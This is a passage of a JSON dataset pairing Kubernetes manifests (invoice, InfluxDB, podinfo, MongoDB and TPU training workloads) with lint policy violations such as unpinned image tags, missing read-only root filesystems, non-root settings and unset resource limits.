cpu: '1'\n        ports:\n        - name: http\n          containerPort: 8082\n        readinessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 20\n          periodSeconds: 15\n          failureThreshold: 6\n        livenessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 120\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"invoice-app\" is using an invalid container image, \"deepu105/invoice\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9077",
    "manifest_path": "data/manifests/the_stack_sample/sample_3425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: invoice\n  namespace: jhipster\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: invoice\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: invoice\n        version: v1\n    spec:\n      initContainers:\n      - name: init-ds\n        image: busybox:latest\n        command:\n        - /bin/sh\n        - -c\n        - \"while true\\ndo\\n  rt=$(nc -z -w 1 invoice-mysql 3306)\\n  if [ $? -eq 0\\\n          \\ ]; then\\n    echo \\\"DB is UP\\\"\\n    break\\n  fi\\n  echo \\\"DB is not yet\\\n          \\ reachable;sleep for 10s before retry\\\"\\n  sleep 10\\ndone\\n\"\n      containers:\n      - name: invoice-app\n        image: deepu105/invoice\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: prod\n        - name: JHIPSTER_SECURITY_AUTHENTICATION_JWT_BASE64_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: jwt-secret\n              key: secret\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:mysql://invoice-mysql.jhipster.svc.cluster.local:3306/invoice?useUnicode=true&characterEncoding=utf8&useSSL=false\n        - name: SPRING_SLEUTH_PROPAGATION_KEYS\n          value: x-request-id,x-ot-span-context\n        - name: JAVA_OPTS\n          value: ' -Xmx256m -Xms256m'\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n            cpu: '1'\n        ports:\n        - name: http\n          containerPort: 8082\n        readinessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 20\n          periodSeconds: 15\n          failureThreshold: 6\n        livenessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 120\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-ds\" does not have a read-only root file system"
  },
  {
    "id": "9078",
    "manifest_path": "data/manifests/the_stack_sample/sample_3425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: invoice\n  namespace: jhipster\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: invoice\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: invoice\n        version: v1\n    spec:\n      initContainers:\n      - name: init-ds\n        image: busybox:latest\n        command:\n        - /bin/sh\n        - -c\n        - \"while true\\ndo\\n  rt=$(nc -z -w 1 invoice-mysql 3306)\\n  if [ $? -eq 0\\\n          \\ ]; then\\n    echo \\\"DB is UP\\\"\\n    break\\n  fi\\n  echo \\\"DB is not yet\\\n          \\ reachable;sleep for 10s before retry\\\"\\n  sleep 10\\ndone\\n\"\n      containers:\n      - name: invoice-app\n        image: deepu105/invoice\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: prod\n        - name: JHIPSTER_SECURITY_AUTHENTICATION_JWT_BASE64_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: jwt-secret\n              key: secret\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:mysql://invoice-mysql.jhipster.svc.cluster.local:3306/invoice?useUnicode=true&characterEncoding=utf8&useSSL=false\n        - name: SPRING_SLEUTH_PROPAGATION_KEYS\n          value: x-request-id,x-ot-span-context\n        - name: JAVA_OPTS\n          value: ' -Xmx256m -Xms256m'\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n            cpu: '1'\n        ports:\n        - name: http\n          containerPort: 8082\n        readinessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 20\n          periodSeconds: 15\n          failureThreshold: 6\n        livenessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 120\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"invoice-app\" does not have a read-only root file system"
  },
  {
    "id": "9079",
    "manifest_path": "data/manifests/the_stack_sample/sample_3425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: invoice\n  namespace: jhipster\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: invoice\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: invoice\n        version: v1\n    spec:\n      initContainers:\n      - name: init-ds\n        image: busybox:latest\n        command:\n        - /bin/sh\n        - -c\n        - \"while true\\ndo\\n  rt=$(nc -z -w 1 invoice-mysql 3306)\\n  if [ $? -eq 0\\\n          \\ ]; then\\n    echo \\\"DB is UP\\\"\\n    break\\n  fi\\n  echo \\\"DB is not yet\\\n          \\ reachable;sleep for 10s before retry\\\"\\n  sleep 10\\ndone\\n\"\n      containers:\n      - name: invoice-app\n        image: deepu105/invoice\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: prod\n        - name: JHIPSTER_SECURITY_AUTHENTICATION_JWT_BASE64_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: jwt-secret\n              key: secret\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:mysql://invoice-mysql.jhipster.svc.cluster.local:3306/invoice?useUnicode=true&characterEncoding=utf8&useSSL=false\n        - name: SPRING_SLEUTH_PROPAGATION_KEYS\n          value: x-request-id,x-ot-span-context\n        - name: JAVA_OPTS\n          value: ' -Xmx256m -Xms256m'\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n            cpu: '1'\n        ports:\n        - name: http\n          containerPort: 8082\n        readinessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 20\n          periodSeconds: 15\n          failureThreshold: 6\n        livenessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 120\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-ds\" is not set to runAsNonRoot"
  },
  {
    "id": "9080",
    "manifest_path": "data/manifests/the_stack_sample/sample_3425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: invoice\n  namespace: jhipster\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: invoice\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: invoice\n        version: v1\n    spec:\n      initContainers:\n      - name: init-ds\n        image: busybox:latest\n        command:\n        - /bin/sh\n        - -c\n        - \"while true\\ndo\\n  rt=$(nc -z -w 1 invoice-mysql 3306)\\n  if [ $? -eq 0\\\n          \\ ]; then\\n    echo \\\"DB is UP\\\"\\n    break\\n  fi\\n  echo \\\"DB is not yet\\\n          \\ reachable;sleep for 10s before retry\\\"\\n  sleep 10\\ndone\\n\"\n      containers:\n      - name: invoice-app\n        image: deepu105/invoice\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: prod\n        - name: JHIPSTER_SECURITY_AUTHENTICATION_JWT_BASE64_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: jwt-secret\n              key: secret\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:mysql://invoice-mysql.jhipster.svc.cluster.local:3306/invoice?useUnicode=true&characterEncoding=utf8&useSSL=false\n        - name: SPRING_SLEUTH_PROPAGATION_KEYS\n          value: x-request-id,x-ot-span-context\n        - name: JAVA_OPTS\n          value: ' -Xmx256m -Xms256m'\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n            cpu: '1'\n        ports:\n        - name: http\n          containerPort: 8082\n        readinessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 20\n          periodSeconds: 15\n          failureThreshold: 6\n        livenessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 120\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"invoice-app\" is not set to runAsNonRoot"
  },
  {
    "id": "9081",
    "manifest_path": "data/manifests/the_stack_sample/sample_3425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: invoice\n  namespace: jhipster\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: invoice\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: invoice\n        version: v1\n    spec:\n      initContainers:\n      - name: init-ds\n        image: busybox:latest\n        command:\n        - /bin/sh\n        - -c\n        - \"while true\\ndo\\n  rt=$(nc -z -w 1 invoice-mysql 3306)\\n  if [ $? -eq 0\\\n          \\ ]; then\\n    echo \\\"DB is UP\\\"\\n    break\\n  fi\\n  echo \\\"DB is not yet\\\n          \\ reachable;sleep for 10s before retry\\\"\\n  sleep 10\\ndone\\n\"\n      containers:\n      - name: invoice-app\n        image: deepu105/invoice\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: prod\n        - name: JHIPSTER_SECURITY_AUTHENTICATION_JWT_BASE64_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: jwt-secret\n              key: secret\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:mysql://invoice-mysql.jhipster.svc.cluster.local:3306/invoice?useUnicode=true&characterEncoding=utf8&useSSL=false\n        - name: SPRING_SLEUTH_PROPAGATION_KEYS\n          value: x-request-id,x-ot-span-context\n        - name: JAVA_OPTS\n          value: ' -Xmx256m -Xms256m'\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n            cpu: '1'\n        ports:\n        - name: http\n          containerPort: 8082\n        readinessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 20\n          periodSeconds: 15\n          failureThreshold: 6\n        livenessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 120\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-ds\" has cpu request 0"
  },
  {
    "id": "9082",
    "manifest_path": "data/manifests/the_stack_sample/sample_3425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: invoice\n  namespace: jhipster\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: invoice\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: invoice\n        version: v1\n    spec:\n      initContainers:\n      - name: init-ds\n        image: busybox:latest\n        command:\n        - /bin/sh\n        - -c\n        - \"while true\\ndo\\n  rt=$(nc -z -w 1 invoice-mysql 3306)\\n  if [ $? -eq 0\\\n          \\ ]; then\\n    echo \\\"DB is UP\\\"\\n    break\\n  fi\\n  echo \\\"DB is not yet\\\n          \\ reachable;sleep for 10s before retry\\\"\\n  sleep 10\\ndone\\n\"\n      containers:\n      - name: invoice-app\n        image: deepu105/invoice\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: prod\n        - name: JHIPSTER_SECURITY_AUTHENTICATION_JWT_BASE64_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: jwt-secret\n              key: secret\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:mysql://invoice-mysql.jhipster.svc.cluster.local:3306/invoice?useUnicode=true&characterEncoding=utf8&useSSL=false\n        - name: SPRING_SLEUTH_PROPAGATION_KEYS\n          value: x-request-id,x-ot-span-context\n        - name: JAVA_OPTS\n          value: ' -Xmx256m -Xms256m'\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n            cpu: '1'\n        ports:\n        - name: http\n          containerPort: 8082\n        readinessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 20\n          periodSeconds: 15\n          failureThreshold: 6\n        livenessProbe:\n          httpGet:\n            path: /invoice/management/health\n            port: http\n          initialDelaySeconds: 120\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-ds\" has memory limit 0"
  },
  {
    "id": "9083",
    "manifest_path": "data/manifests/the_stack_sample/sample_3426.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: replicas-job\nspec:\n  template:\n    metadata:\n      labels:\n        app: replicas-job\n    spec:\n      containers:\n      - name: replicas-job\n        image: massenz/mongo-replicas:0.6.1\n        imagePullPolicy: Always\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "9084",
    "manifest_path": "data/manifests/the_stack_sample/sample_3426.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: replicas-job\nspec:\n  template:\n    metadata:\n      labels:\n        app: replicas-job\n    spec:\n      containers:\n      - name: replicas-job\n        image: massenz/mongo-replicas:0.6.1\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"replicas-job\" does not have a read-only root file system"
  },
  {
    "id": "9085",
    "manifest_path": "data/manifests/the_stack_sample/sample_3426.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: replicas-job\nspec:\n  template:\n    metadata:\n      labels:\n        app: replicas-job\n    spec:\n      containers:\n      - name: replicas-job\n        image: massenz/mongo-replicas:0.6.1\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"replicas-job\" is not set to runAsNonRoot"
  },
  {
    "id": "9086",
    "manifest_path": "data/manifests/the_stack_sample/sample_3426.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: replicas-job\nspec:\n  template:\n    metadata:\n      labels:\n        app: replicas-job\n    spec:\n      containers:\n      - name: replicas-job\n        image: massenz/mongo-replicas:0.6.1\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"replicas-job\" has cpu request 0"
  },
  {
    "id": "9087",
    "manifest_path": "data/manifests/the_stack_sample/sample_3426.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: replicas-job\nspec:\n  template:\n    metadata:\n      labels:\n        app: replicas-job\n    spec:\n      containers:\n      - name: replicas-job\n        image: massenz/mongo-replicas:0.6.1\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"replicas-job\" has memory limit 0"
  },
  {
    "id": "9088",
    "manifest_path": "data/manifests/the_stack_sample/sample_3431.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: influxdb\n  labels:\n    app: influxdb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: influxdb\n  template:\n    metadata:\n      labels:\n        app: influxdb\n    spec:\n      containers:\n      - image: influxdb:1.7.4-alpine\n        name: influxdb\n        env:\n        - name: INFLUXDB_DB\n          value: iot\n        - name: INFLUXDB_ADMIN_USER\n          valueFrom:\n            secretKeyRef:\n              name: influxdb-grafana\n              key: influxdb-user\n        - name: INFLUXDB_ADMIN_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: influxdb-grafana\n              key: influxdb-password\n        ports:\n        - containerPort: 8086\n        volumeMounts:\n        - name: influxdb-data\n          mountPath: /var/lib/influxdb\n      volumes:\n      - name: influxdb-data\n        persistentVolumeClaim:\n          claimName: influxdb-volumeclaim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"influxdb\" does not have a read-only root file system"
  },
  {
    "id": "9089",
    "manifest_path": "data/manifests/the_stack_sample/sample_3431.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: influxdb\n  labels:\n    app: influxdb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: influxdb\n  template:\n    metadata:\n      labels:\n        app: influxdb\n    spec:\n      containers:\n      - image: influxdb:1.7.4-alpine\n        name: influxdb\n        env:\n        - name: INFLUXDB_DB\n          value: iot\n        - name: INFLUXDB_ADMIN_USER\n          valueFrom:\n            secretKeyRef:\n              name: influxdb-grafana\n              key: influxdb-user\n        - name: INFLUXDB_ADMIN_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: influxdb-grafana\n              key: influxdb-password\n        ports:\n        - containerPort: 8086\n        volumeMounts:\n        - name: influxdb-data\n          mountPath: /var/lib/influxdb\n      volumes:\n      - name: influxdb-data\n        persistentVolumeClaim:\n          claimName: influxdb-volumeclaim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"influxdb\" is not set to runAsNonRoot"
  },
  {
    "id": "9090",
    "manifest_path": "data/manifests/the_stack_sample/sample_3431.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: influxdb\n  labels:\n    app: influxdb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: influxdb\n  template:\n    metadata:\n      labels:\n        app: influxdb\n    spec:\n      containers:\n      - image: influxdb:1.7.4-alpine\n        name: influxdb\n        env:\n        - name: INFLUXDB_DB\n          value: iot\n        - name: INFLUXDB_ADMIN_USER\n          valueFrom:\n            secretKeyRef:\n              name: influxdb-grafana\n              key: influxdb-user\n        - name: INFLUXDB_ADMIN_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: influxdb-grafana\n              key: influxdb-password\n        ports:\n        - containerPort: 8086\n        volumeMounts:\n        - name: influxdb-data\n          mountPath: /var/lib/influxdb\n      volumes:\n      - name: influxdb-data\n        persistentVolumeClaim:\n          claimName: influxdb-volumeclaim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"influxdb\" has cpu request 0"
  },
  {
    "id": "9091",
    "manifest_path": "data/manifests/the_stack_sample/sample_3431.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: influxdb\n  labels:\n    app: influxdb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: influxdb\n  template:\n    metadata:\n      labels:\n        app: influxdb\n    spec:\n      containers:\n      - image: influxdb:1.7.4-alpine\n        name: influxdb\n        env:\n        - name: INFLUXDB_DB\n          value: iot\n        - name: INFLUXDB_ADMIN_USER\n          valueFrom:\n            secretKeyRef:\n              name: influxdb-grafana\n              key: influxdb-user\n        - name: INFLUXDB_ADMIN_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: influxdb-grafana\n              key: influxdb-password\n        ports:\n        - containerPort: 8086\n        volumeMounts:\n        - name: influxdb-data\n          mountPath: /var/lib/influxdb\n      volumes:\n      - name: influxdb-data\n        persistentVolumeClaim:\n          claimName: influxdb-volumeclaim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"influxdb\" has memory limit 0"
  },
  {
    "id": "9092",
    "manifest_path": "data/manifests/the_stack_sample/sample_3436.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  labels:\n    app: podinfo\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: blue\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"podinfod\" does not have a read-only root file system"
  },
  {
    "id": "9093",
    "manifest_path": "data/manifests/the_stack_sample/sample_3436.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  labels:\n    app: podinfo\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: blue\n        livenessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/healthz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            command:\n            - podcli\n            - check\n            - http\n            - localhost:9898/readyz\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"podinfod\" is not set to runAsNonRoot"
  },
  {
    "id": "9094",
    "manifest_path": "data/manifests/the_stack_sample/sample_3437.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: case-study-ui-service-DEPLOY_ENV\n  name: case-study-ui-service-DEPLOY_ENV\nspec:\n  ports:\n  - port: 8080\n    targetPort: 8080\n  selector:\n    app: case-study-ui-deployment-DEPLOY_ENV\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:case-study-ui-deployment-DEPLOY_ENV])"
  },
  {
    "id": "9095",
    "manifest_path": "data/manifests/the_stack_sample/sample_3439.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-bert-mnli-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/bert/run_classifier.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --steps_per_loop=1000\n          - --input_meta_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_meta_data\n          - --train_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_train.tf_record\n          - --eval_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_eval.tf_record\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_model.ckpt\n          - --learning_rate=3e-5\n          - --distribution_strategy=tpu\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=64\n          - --eval_batch_size=64\n          - --num_train_epochs=6\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-bert-mnli-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"monitor\" does not have a read-only root file system"
  },
  {
    "id": "9096",
    "manifest_path": "data/manifests/the_stack_sample/sample_3439.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-bert-mnli-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/bert/run_classifier.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --steps_per_loop=1000\n          - --input_meta_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_meta_data\n          - --train_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_train.tf_record\n          - --eval_data_path=$(BERT_CLASSIFICATION_DIR)/mnli_eval.tf_record\n          - --bert_config_file=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_config.json\n          - --init_checkpoint=$(KERAS_BERT_DIR)/uncased_L-24_H-1024_A-16/bert_model.ckpt\n          - --learning_rate=3e-5\n          - --distribution_strategy=tpu\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=64\n          - --eval_batch_size=64\n          - --num_train_epochs=6\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/bert-mnli/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: 